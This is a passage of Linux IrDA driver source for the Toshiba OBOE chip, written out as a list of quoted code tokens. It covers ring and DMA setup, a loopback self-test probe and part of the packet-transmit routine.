"(", "struct", "toshoboe_cb", "*", "self", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "TX_SLOTS", ";", "+", "+", "i", ")", "{", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "len", "=", "0", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "control", "=", "0x00", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "address", "=", "virt_to_bus", "(", "self", "-", ">", "tx_bufs", "[", "i", "]", ");", "}", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "{", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "len", "=", "RX_LEN", ";", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "len", "=", "0", ";", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "address", "=", "virt_to_bus", "(", "self", "-", ">", "rx_bufs", "[", "i", "]", ");", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "control", "=", "OBOE_CTL_RX_HW_OWNS", ";", "}", "}", "static", "void", "toshoboe_resetptrs", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "/", "*", "Can", "reset", "pointers", "by", "twidling", "DMA", "*", "/", "OUTB", "(", "0x0", ",", "OBOE_ENABLEH", ")", ";", "OUTBP", "(", "CONFIG0H_DMA_OFF", ",", "OBOE_CONFIG0H", ")", ";", "OUTB", "(", "OBOE_ENABLEH_PHYANDCLOCK", ",", "OBOE_ENABLEH", ")", ";", "self", "-", ">", "rxs", "=", "inb_p", "(", "OBOE_RXSLOT", ")", "&", "OBOE_SLOT_MASK", ";", "self", "-", ">", "txs", "=", "inb_p", "(", "OBOE_TXSLOT", ")", "&", "OBOE_SLOT_MASK", ";", "}", "/", "*", "Called", "in", "locked", "state", "*", "/", "static", "void", "toshoboe_initptrs", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "/", "*", "spin_lock_irqsave", "(", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "*", "/", "/", "*", "save_flags", "(", "flags", ")", ";", "*", "/", "/", "*", "Can", "reset", "pointers", "by", "twidling", "DMA", "*", "/", "toshoboe_resetptrs", "(", "self", ")", ";", "OUTB", "(", "0x0", ",", "OBOE_ENABLEH", ")", ";", "OUTB", "(", "CONFIG0H_DMA_ON", ",", "OBOE_CONFIG0H", ")", ";", "OUTB", "(", "OBOE_ENABLEH_PHYANDCLOCK", ",", "OBOE_ENABLEH", ")", ";", "self", "-", ">", "txpending", "=", "0", ";", "/", "*", "spin_unlock_irqrestore", "(", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "*", "/", "/", "*", "restore_flags", "(", "flags", ")", ";", "*", "/", "}", "/", "*", "Wake", "the", "chip", "up", "and", "get", "it", "looking", "at", "the", "rings", "*", "/", "/", "*", "Called", "in", "locked", "state", "*", "/", "static", "void", "toshoboe_startchip", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "__u32", "physaddr", ";", "toshoboe_initring", "(", "self", ")", ";", "toshoboe_enablebm", "(", "self", ")", ";", "OUTBP", "(", "OBOE_CONFIG1_RESET", ",", "OBOE_CONFIG1", ")", ";", "OUTBP", "(", "OBOE_CONFIG1_ON", ",", "OBOE_CONFIG1", ")", ";", "/", "*", "Stop", "the", "clocks", "*", "/", "OUTB", "(", "0", ",", "OBOE_ENABLEH", ")", ";", "/", "*", "Set", "size", "of", "rings", "*", "/", "OUTB", "(", "RING_SIZE", ",", "OBOE_RING_SIZE", ")", ";", "/", "*", "Acknoledge", "any", "pending", "interrupts", "*", "/", "OUTB", "(", "0xff", ",", "OBOE_ISR", ")", ";", "/", "*", "Enable", "ints", "*", "/", "OUTB", "(", "OBOE_INT_TXDONE", "|", "OBOE_INT_RXDONE", "|", "OBOE_INT_TXUNDER", "|", "OBOE_INT_RXOVER", "|", "OBOE_INT_SIP", ",", "OBOE_IER", ")", ";", "/", "*", "Acknoledge", "any", "pending", "interrupts", "*", "/", "OUTB", "(", "0xff", ",", "OBOE_ISR", ")", ";", "/", "*", "Set", "the", "maximum", "packet", "length", "to", "0xfff", "(", "4095", ")", "*", "/", "OUTB", "(", "RX_LEN", ">", ">", "8", ",", "OBOE_MAXLENH", ")", ";", "OUTB", "(", "RX_LEN", "&", "0xff", ",", "OBOE_MAXLENL", ")", ";", "/", "*", "Shutdown", "DMA", "*", "/", "OUTB", "(", "CONFIG0H_DMA_OFF", ",", "OBOE_CONFIG0H", ")", ";", "/", "*", "Find", "out", "where", "the", "rings", "live", "*", "/", "physaddr", "=", "virt_to_bus", "(", "self", "-", ">", "ring", ")", ";", "IRDA_ASSERT", "(", "(", "physaddr", "&", "0x3ff", ")", "=", "=", "0", ",", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", "ring", "not", "correctly", "aligned", "\\", "n", "\"", ");", "return", ";", ");", "OUTB", "(", "(", "physaddr", ">", ">", "10", ")", "&", "0xff", ",", "OBOE_RING_BASE0", ")", ";", "OUTB", "(", "(", "physaddr", ">", ">", "18", ")", "&", "0xff", ",", "OBOE_RING_BASE1", ")", ";", "OUTB", "(", "(", "physaddr", ">", ">", "26", ")", "&", "0x3f", ",", "OBOE_RING_BASE2", ")", ";", "/", "*", "Enable", "DMA", "controller", "in", "byte", "mode", "and", "RX", "*", "/", "OUTB", "(", "CONFIG0H_DMA_ON", ",", "OBOE_CONFIG0H", ")", ";", "/", "*", "Start", "up", "the", "clocks", "*", "/", "OUTB", "(", "OBOE_ENABLEH_PHYANDCLOCK", ",", "OBOE_ENABLEH", ")", ";", "/", "*", "set", "to", "sensible", "speed", "*", "/", "self", "-", ">", "speed", "=", "9600", ";", "toshoboe_setbaud", "(", "self", ")", ";", "toshoboe_initptrs", "(", "self", ")", ";", "}", "static", "void", "toshoboe_isntstuck", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "}", "static", "void", "toshoboe_checkstuck", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "unsigned", "long", "flags", ";", "if", "(", "0", ")", "{", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "/", "*", "This", "will", "reset", "the", "chip", "completely", "*", "/", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "Resetting", "chip", "\\", "n", "\"", ");", "toshoboe_stopchip", "(", "self", ")", ";", "toshoboe_startchip", "(", "self", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "}", "}", "/", "*", "Generate", "packet", "of", "about", "mtt", "us", "long", "*", "/", "static", "int", "toshoboe_makemttpacket", "(", "struct", "toshoboe_cb", "*", "self", ",", "void", "*", "buf", ",", "int", "mtt", ")", "{", "int", "xbofs", ";", "xbofs", "=", "(", "(", "int", ")", "(", "mtt", "/", "100", ")", ")", "*", "(", "int", ")", "(", "self", "-", ">", "speed", ")", ";", "xbofs", "=", "xbofs", "/", "80000", ";", "/", "*", "Eight", "bits", "per", "byte", ",", "and", "mtt", "is", "in", "us", "*", "/", "xbofs", "+", "+;", "pr_debug", "(", "DRIVER_NAME", "\"", ":", "generated", "mtt", "of", "%", "d", "bytes", "for", "%", "d", "us", "at", "%", "d", "baud", "\\", "n", "\"", ",", "xbofs", ",", "mtt", ",", "self", "-", ">", "speed", ")", ";", "if", "(", "xbofs", ">", "TX_LEN", ")", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "wanted", "%", "d", "bytes", "MTT", "but", "TX_LEN", "is", "%", "d", "\\", "n", "\"", ",", "xbofs", ",", "TX_LEN", ")", ";", "xbofs", "=", "TX_LEN", ";", "}", "/", "*", "xbofs", "will", "do", "for", "SIR", ",", "MIR", "and", "FIR", ",", "SIR", "mode", "doesn", "'", "t", "generate", "a", "checksum", "anyway", "*", "/", "memset", "(", "buf", ",", "XBOF", ",", "xbofs", ")", ";", "return", "xbofs", ";", "}", "#", "ifdef", "USE_PROBE", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "Probe", "code", "*", "/", "static", "void", "toshoboe_dumptx", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "int", "i", ";", "PROBE_DEBUG", "(", "KERN_WARNING", "\"", "TX", ":", "\")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "PROBE_DEBUG", "(", "\"", "(", "%", "d", ",", "%", "02x", ")", "\",", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "len", ",", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "control", ")", ";", "PROBE_DEBUG", "(", "\"", "[", "%", "d", "]", "\\", "n", "\"", ",", "self", "-", ">", "speed", ")", ";", "}", "static", "void", "toshoboe_dumprx", "(", "struct", "toshoboe_cb", "*", "self", ",", "int", "score", ")", "{", "int", "i", ";", "PROBE_DEBUG", "(", "\"", "%", "d", "\\", "nRX", ":", "\",", "score", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "PROBE_DEBUG", "(", "\"", "(", "%", "d", ",", "%", "02x", ")", "\",", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "len", ",", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "control", ")", ";", "PROBE_DEBUG", "(", "\"\\", "n", "\"", ");", "}", "static", "inline", "int", "stuff_byte", "(", "__u8", "byte", ",", "__u8", "*", "buf", ")", "{", "switch", "(", "byte", ")", "{", "case", "BOF", ":", "/", "*", "FALLTHROUGH", "*", "/", "case", "EOF", ":", "/", "*", "FALLTHROUGH", "*", "/", "case", "CE", ":", "/", "*", "Insert", "transparently", "coded", "*", "/", "buf", "[", "0", "]", "=", "CE", ";", "/", "*", "Send", "link", "escape", "*", "/", "buf", "[", "1", "]", "=", "byte", "^", "IRDA_TRANS", ";", "/", "*", "Complement", "bit", "5", "*", "/", "return", "2", ";", "/", "*", "break", ";", "*", "/", "default", ":", "/", "*", "Non", "-", "special", "value", ",", "no", "transparency", "required", "*", "/", "buf", "[", "0", "]", "=", "byte", ";", "return", "1", ";", "/", "*", "break", ";", "*", "/", "}", "}", "static", "irqreturn_t", "toshoboe_probeinterrupt", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "toshoboe_cb", "*", "self", "=", "dev_id", ";", "__u8", "irqstat", ";", "irqstat", "=", "INB", "(", "OBOE_ISR", ")", ";", "/", "*", "was", "it", "us", "*", "/", "if", "(", "!(", "irqstat", "&", "OBOE_INT_MASK", ")", ")", "return", "IRQ_NONE", ";", "/", "*", "Ack", "all", "the", "interrupts", "*", "/", "OUTB", "(", "irqstat", ",", "OBOE_ISR", ")", ";", "if", "(", "irqstat", "&", "OBOE_INT_TXDONE", ")", "{", "int", "txp", ";", "self", "-", ">", "int_tx", "+", "+;", "PROBE_DEBUG", "(", "\"", "T", "\"", ");", "txp", "=", "INB", "(", "OBOE_TXSLOT", ")", "&", "OBOE_SLOT_MASK", ";", "if", "(", "self", "-", ">", "ring", "-", ">", "tx", "[", "txp", "]", ".", "control", "&", "OBOE_CTL_TX_HW_OWNS", ")", "{", "self", "-", ">", "int_tx", "+", "=", "100", ";", "PROBE_DEBUG", "(", "\"", "S", "\"", ");", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", "|", "OBOE_CONFIG0H_LOOP", ")", ";", "}", "}", "if", "(", "irqstat", "&", "OBOE_INT_RXDONE", ")", "{", "self", "-", ">", "int_rx", "+", "+;", "PROBE_DEBUG", "(", "\"", "R", "\"", ");", "}", "if", "(", "irqstat", "&", "OBOE_INT_TXUNDER", ")", "{", "self", "-", ">", "int_txunder", "+", "+;", "PROBE_DEBUG", "(", "\"", "U", "\"", ");", "}", "if", "(", "irqstat", "&", "OBOE_INT_RXOVER", ")", "{", "self", "-", ">", "int_rxover", "+", "+;", "PROBE_DEBUG", "(", "\"", "O", "\"", ");", "}", "if", "(", "irqstat", "&", "OBOE_INT_SIP", ")", "{", "self", "-", ">", "int_sip", "+", "+;", "PROBE_DEBUG", "(", "\"", "I", "\"", ");", "}", "return", "IRQ_HANDLED", ";", "}", "static", "int", "toshoboe_maketestpacket", "(", "unsigned", "char", "*", "buf", ",", "int", "badcrc", ",", "int", "fir", ")", "{", "int", "i", ";", "int", "len", "=", "0", ";", "union", "{", "__u16", "value", ";", "__u8", "bytes", "[", "2", "]", ";", "}", "fcs", ";", "if", "(", "fir", ")", "{", "memset", "(", "buf", ",", "0", ",", "TT_LEN", ")", ";", "return", "TT_LEN", ";", "}", "fcs", ".", "value", "=", "INIT_FCS", ";", "memset", "(", "buf", ",", "XBOF", ",", "10", ")", ";", "len", "+", "=", "10", ";", "buf", "[", "len", "+", "+]", "=", "BOF", ";", "for", "(", "i", "=", "0", ";", "i", "<", "TT_LEN", ";", "+", "+", "i", ")", "{", "len", "+", "=", "stuff_byte", "(", "i", ",", "buf", "+", "len", ")", ";", "fcs", ".", "value", "=", "irda_fcs", "(", "fcs", ".", "value", ",", "i", ")", ";", "}", "len", "+", "=", "stuff_byte", "(", "fcs", ".", "bytes", "[", "0", "]", "^", "badcrc", ",", "buf", "+", "len", ")", ";", "len", "+", "=", "stuff_byte", "(", "fcs", ".", "bytes", "[", "1", "]", "^", "badcrc", ",", "buf", "+", "len", ")", ";", "buf", "[", "len", "+", "+]", "=", "EOF", ";", "len", "+", "+;", "return", "len", ";", "}", "static", "int", "toshoboe_probefail", "(", "struct", "toshoboe_cb", "*", "self", ",", "char", "*", "msg", ")", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", "probe", "(", "%", "d", ")", "failed", "%", "s", "\\", "n", "\"", ",", "self", "-", ">", "speed", ",", "msg", ")", ";", "toshoboe_dumpregs", "(", "self", ")", ";", "toshoboe_stopchip", "(", "self", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "(", "void", "*", ")", "self", ")", ";", "return", "0", ";", "}", "static", "int", "toshoboe_numvalidrcvs", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "int", "i", ",", "ret", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "if", "(", "(", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "control", "&", "0xe0", ")", "=", "=", "0", ")", "ret", "+", "+;", "return", "ret", ";", "}", "static", "int", "toshoboe_numrcvs", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "int", "i", ",", "ret", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "if", "(", "!(", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "control", "&", "OBOE_CTL_RX_HW_OWNS", ")", ")", "ret", "+", "+;", "return", "ret", ";", "}", "static", "int", "toshoboe_probe", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "int", "i", ",", "j", ",", "n", ";", "#", "ifdef", "USE_MIR", "static", "const", "int", "bauds", "[", "]", "=", "{", "9600", ",", "115200", ",", "4000000", ",", "1152000", "}", ";", "#", "else", "static", "const", "int", "bauds", "[", "]", "=", "{", "9600", ",", "115200", ",", "4000000", "}", ";", "#", "endif", "unsigned", "long", "flags", ";", "if", "(", "request_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "toshoboe_probeinterrupt", ",", "self", "-", ">", "io", ".", "irqflags", ",", "\"", "toshoboe", "\"", ",", "(", "void", "*", ")", "self", ")", ")", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "probe", "failed", "to", "allocate", "irq", "%", "d", "\\", "n", "\"", ",", "self", "-", ">", "io", ".", "irq", ")", ";", "return", "0", ";", "}", "/", "*", "test", "1", ":", "SIR", "filter", "and", "back", "to", "back", "*", "/", "for", "(", "j", "=", "0", ";", "j", "<", "ARRAY_SIZE", "(", "bauds", ")", ";", "+", "+", "j", ")", "{", "int", "fir", "=", "(", "j", ">", "1", ")", ";", "toshoboe_stopchip", "(", "self", ")", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "/", "*", "Address", "is", "already", "setup", "*", "/", "toshoboe_startchip", "(", "self", ")", ";", "self", "-", ">", "int_rx", "=", "self", "-", ">", "int_tx", "=", "0", ";", "self", "-", ">", "speed", "=", "bauds", "[", "j", "]", ";", "toshoboe_setbaud", "(", "self", ")", ";", "toshoboe_initptrs", "(", "self", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "/", "*", "(", "FIR", "only", ")", "OBOE_CTL_TX_SIP", "needed", "for", "switching", "to", "next", "slot", "*", "/", "/", "*", "MIR", ":", "all", "received", "data", "is", "stored", "in", "one", "slot", "*", "/", "(", "fir", ")", "?", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", ":", "OBOE_CTL_TX_HW_OWNS", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "toshoboe_maketestpacket", "(", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "0", ",", "fir", ")", ";", "self", "-", ">", "txs", "+", "+;", "self", "-", ">", "txs", "%", "=", "TX_SLOTS", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "(", "fir", ")", "?", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_SIP", ":", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "toshoboe_maketestpacket", "(", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "0", ",", "fir", ")", ";", "self", "-", ">", "txs", "+", "+;", "self", "-", ">", "txs", "%", "=", "TX_SLOTS", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "(", "fir", ")", "?", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", ":", "OBOE_CTL_TX_HW_OWNS", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "toshoboe_maketestpacket", "(", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "0", ",", "fir", ")", ";", "self", "-", ">", "txs", "+", "+;", "self", "-", ">", "txs", "%", "=", "TX_SLOTS", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "(", "fir", ")", "?", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", "|", "OBOE_CTL_TX_SIP", "|", "OBOE_CTL_TX_BAD_CRC", ":", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "toshoboe_maketestpacket", "(", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "0", ",", "fir", ")", ";", "self", "-", ">", "txs", "+", "+;", "self", "-", ">", "txs", "%", "=", "TX_SLOTS", ";", "toshoboe_dumptx", "(", "self", ")", ";", "/", "*", "Turn", "on", "TX", "and", "RX", "and", "loopback", "*", "/", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", "|", "OBOE_CONFIG0H_LOOP", ")", ";", "i", "=", "0", ";", "n", "=", "fir", "?", "1", ":", "4", ";", "while", "(", "toshoboe_numvalidrcvs", "(", "self", ")", "!", "=", "n", ")", "{", "if", "(", "i", ">", "4800", ")", "return", "toshoboe_probefail", "(", "self", ",", "\"", "filter", "test", "\"", ");", "udelay", "(", "(", "9600", "*", "(", "TT_LEN", "+", "16", ")", ")/", "self", "-", ">", "speed", ")", ";", "i", "+", "+;", "}", "n", "=", "fir", "?", "203", ":", "102", ";", "while", "(", "(", "toshoboe_numrcvs", "(", "self", ")", "!", "=", "self", "-", ">", "int_rx", ")", "|", "|", "(", "self", "-", ">", "int_tx", "!", "=", "n", ")", ")", "{", "if", "(", "i", ">", "4800", ")", "return", "toshoboe_probefail", "(", "self", ",", "\"", "interrupt", "test", "\"", ");", "udelay", "(", "(", "9600", "*", "(", "TT_LEN", "+", "16", ")", ")/", "self", "-", ">", "speed", ")", ";", "i", "+", "+;", "}", "toshoboe_dumprx", "(", "self", ",", "i", ")", ";", "}", "/", "*", "test", "2", ":", "SIR", "in", "char", "at", "a", "time", "*", "/", "toshoboe_stopchip", "(", "self", ")", ";", "self", "-", ">", "int_rx", "=", "self", "-", ">", "int_tx", "=", "0", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "toshoboe_startchip", "(", "self", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "self", "-", ">", "async", "=", "1", ";", "self", "-", ">", "speed", "=", "115200", ";", "toshoboe_setbaud", "(", "self", ")", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "OBOE_CTL_TX_RTCENTX", "|", "OBOE_CTL_TX_HW_OWNS", ";", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "4", ";", "(", "(", "unsigned", "char", "*", ")", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ")[", "0", "]", "=", "'", "f", "'", ";", "(", "(", "unsigned", "char", "*", ")", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ")[", "1", "]", "=", "'", "i", "'", ";", "(", "(", "unsigned", "char", "*", ")", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ")[", "2", "]", "=", "'", "s", "'", ";", "(", "(", "unsigned", "char", "*", ")", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ")[", "3", "]", "=", "'", "h", "'", ";", "toshoboe_dumptx", "(", "self", ")", ";", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", "|", "OBOE_CONFIG0H_LOOP", ")", ";", "i", "=", "0", ";", "while", "(", "toshoboe_numvalidrcvs", "(", "self", ")", "!", "=", "4", ")", "{", "if", "(", "i", ">", "100", ")", "return", "toshoboe_probefail", "(", "self", ",", "\"", "Async", "test", "\"", ");", "udelay", "(", "100", ")", ";", "i", "+", "+;", "}", "while", "(", "(", "toshoboe_numrcvs", "(", "self", ")", "!", "=", "self", "-", ">", "int_rx", ")", "|", "|", "(", "self", "-", ">", "int_tx", "!", "=", "1", ")", ")", "{", "if", "(", "i", ">", "100", ")", "return", "toshoboe_probefail", "(", "self", ",", "\"", "Async", "interrupt", "test", "\"", ");", "udelay", "(", "100", ")", ";", "i", "+", "+;", "}", "toshoboe_dumprx", "(", "self", ",", "i", ")", ";", "self", "-", ">", "async", "=", "0", ";", "self", "-", ">", "speed", "=", "9600", ";", "toshoboe_setbaud", "(", "self", ")", ";", "toshoboe_stopchip", "(", "self", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "(", "void", "*", ")", "self", ")", ";", "printk", "(", "KERN_WARNING", "DRIVER_NAME", "\"", ":", "Self", "test", "passed", "ok", "\\", "n", "\"", ");", "return", "1", ";", "}", "#", "endif", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "Netdev", "style", "code", "*", "/", "/", "*", "Transmit", "something", "*", "/", "static", "netdev_tx_t", "toshoboe_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "toshoboe_cb", "*", "self", ";", "__s32", "speed", ";", "int", "mtt", ",", "len", ",", "ctl", ";", "unsigned", "long", "flags", ";", "struct", "irda_skb_cb", "*", "cb", "=", "(", "struct", "irda_skb_cb", "*", ")", "skb", "-", ">", "cb", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "NETDEV_TX_OK", ";", ")", ";", "pr_debug", "(", "\"%", "s", ".", "tx", ":", "%", "x", "(", "%", "x", ")", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "skb", "-", ">", "len", ",", "self", "-", ">", "txpending", ",", "INB", "(", "OBOE_ENABLEH", ")", ");", "if", "(", "!", "cb", "-", ">", "magic", ")", "{", "pr_debug", "(", "\"%", "s", ".", "Not", "IrLAP", ":", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "cb", "-", ">", "magic", ")", ";", "#", "ifdef", "DUMP_PACKETS", "_dumpbufs", "(", "skb", "-", ">", "data", ",", "skb", "-", ">", "len", ",", "'>", "')", ";", "#", "endif", "}", "/", "*", "change", "speed", "pending", ",", "wait", "for", "its", "execution", "*", "/", "if", "(", "self", "-", ">", "new_speed", ")", "return", "NETDEV_TX_BUSY", ";", "/", "*", "device", "stopped", "(", "apm", ")", "wait", "for", "restart", "*", "/", "if", "(", "self", "-", ">", "stopped", ")", "return", "NETDEV_TX_BUSY", ";", "toshoboe_checkstuck", "(", "self", ")", ";", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "/", "*", "But", "not", "now", ".", "Wait", "after", "transmission", "if", "mtt", "not", "required", "*", "/", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "(", "speed", "!", "=", "self", "-", ">", "io", ".", "speed", ")", "&", "&", "(", "speed", "!", "=", "-", "1", ")", ")", "{", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "if", "(", "self", "-", ">", "txpending", "|", "|", "skb", "-", ">", "len", ")", "{", "self", "-", ">", "new_speed", "=", "speed", ";", "pr_debug", "(", "\"%", "s", ":", "Queued", "TxDone", "scheduled", "speed", "change", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "speed", ")", ";", "/", "*", "if", "no", "data", ",", "that", "'", "s", "all", "!", "*", "/", "if", "(", "!", "skb", "-", ">", "len", ")", "{", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "True", "packet", ",", "go", "on", ",", "but", "*", "/", "/", "*", "do", "not", "accept", "anything", "before", "change", "speed", "execution", "*", "/", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "ready", "to", "process", "TxDone", "interrupt", "*", "/", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "}", "else", "{", "/", "*", "idle", "and", "no", "data", ",", "change", "speed", "now", "*", "/", "self", "-", ">", "speed", "=", "speed", ";", "toshoboe_setbaud", "(", "self", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "}", "if", "(", "(", "mtt", "=", "irda_get_mtt", "(", "skb", ")", "))", "{", "/", "*", "This", "is", "fair", "since", "the", "queue", "should", "be", "empty", "anyway", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "if", "(", "self", "-", ">", "txpending", ")", "{", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "return", "NETDEV_TX_BUSY", ";", "}", "/", "*", "If", "in", "SIR", "mode", "we", "need", "to", "generate", "a", "string", "of", "XBOFs", "*", "/", "/", "*", "In", "MIR", "and", "FIR", "we", "need", "to", "generate", "a", "string", "of", "data", "*", "/", "/", "*", "which", "we", "will", "add", "a", "wrong", "checksum", "to", "*", "/", "mtt", "=", "toshoboe_makemttpacket", "(", "self", ",", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "mtt", ")", ";", "pr_debug", "(", "\"%", "s", ".", "mtt", ":", "%", "x", "(", "%", "x", ")", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "skb", "-", ">", "len", ",", "mtt", ",", "self", "-", ">", "txpending", ")", ";", "if", "(", "mtt", ")", "{", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "mtt", "&", "0xfff", ";", "ctl", "=", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", ";", "if", "(", "INB", "(", "OBOE_ENABLEH", ")", "&", "OBOE_ENABLEH_FIRON", ")", "{", "ctl", "|", "=", "OBOE_CTL_TX_BAD_CRC", "|", "OBOE_CTL_TX_SIP", ";", "}", "#", "ifdef", "USE_MIR", "else", "if", "(", "INB", "(", "OBOE_ENABLEH", ")", "&", "OBOE_ENABLEH_MIRON", ")", "{", "ctl", "|", "=", "OBOE_CTL_TX_BAD_CRC", ";", "}", "#", "endif", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "ctl", ";", "OUTB", "(", "0x0", ",", "OBOE_ENABLEH", ")", ";", "/", "*", "It", "is", 